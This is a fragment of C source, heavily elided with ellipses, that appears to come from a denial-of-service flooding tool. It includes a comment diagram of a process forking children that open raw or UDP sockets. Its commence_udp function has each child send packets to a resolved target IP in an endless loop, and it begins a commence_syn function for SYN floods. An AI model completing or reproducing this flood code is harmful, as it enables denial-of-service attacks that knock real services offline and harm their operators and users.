...
while:
     process
      |
      |-------fork-->child (create raw/udp sock)
      |
      |-------fork-->child (create raw/udp sock)
      |
      |......
*/
void commence_udp (char *ip) {
    int i = -1, p;
    ...
    while ((parse != NULL) && (i++ < CHLD_MAX)) {
        ...
        if (!p) {  
            ...
            if (resolved == -1)
                exit (0);
            while (1) { 
                udp (resolved); // sendto --- rwasock. (child process)
            }
        }
#ifdef ATTACKLOG
        {
...
void commence_syn (char *ip, int port) {
    int i = -1, p;
    unsigned long resolved = 0;
    char *parse;
